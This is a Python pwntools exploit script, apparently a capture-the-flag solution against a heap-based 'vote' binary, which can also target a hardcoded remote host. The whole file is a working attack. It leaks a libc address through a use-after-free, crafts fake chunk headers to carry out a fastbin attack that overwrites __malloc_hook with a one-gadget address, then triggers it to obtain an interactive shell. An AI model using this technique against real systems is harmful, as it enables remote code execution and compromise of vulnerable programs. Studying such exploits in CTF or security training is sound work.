#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./vote"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
libc_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("47.97.190.1",6000)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address :0x%x"%libc_address)
    pause()
def create(size,name):
    conn.sendlineafter("Action: ","0")
    conn.sendlineafter("size: ",str(size))
    conn.sendafter("name: ",name)

def show(index):
    conn.sendlineafter("Action: ","1")
    conn.sendlineafter("index: ",str(index))
    name=conn.recvline()[len("name: "):]
    count=int(conn.recvline()[len("count: "):])
    time=int(conn.recvline()[len("time: "):])
    return name,count,time

def cancel(index):
    conn.sendlineafter("Action: ","4")
    conn.sendlineafter("index: ",str(index))

def vote(index):
    conn.sendlineafter("Action: ","2")
    conn.sendlineafter("index: ",str(index))

create(0x180,"a\n") # 0
create(0x180,"a\n") # 1
cancel(0)
name,count,time=show(0)
create(0x180,"a\n") # 2
libc_address=count-0x3c4b78
create(0x100,"a\n") # 3
create(0x100,"a\n") # 4
create(0x100,"a\n") # 5
cancel(3)
cancel(4)
payload="a"*0x100+p64(0)+p64(0x71)+"a"*0x60+p64(0)+p64(0x11)
create(0x200,payload+"\n") # 6
cancel(4)
cancel(6)
payload="a"*0x100+p64(0)+p64(0x71)+p64(libc.symbols["__malloc_hook"]+libc_address-0x23)
create(0x200,payload+"\n")
create(0x50,"a\n")
gadget=0xf1117
create(0x50,"a"*3+p64(gadget+libc_address)+"\n")
conn.sendlineafter("Action: ","0")
conn.sendlineafter("size: ","20")
conn.interactive()




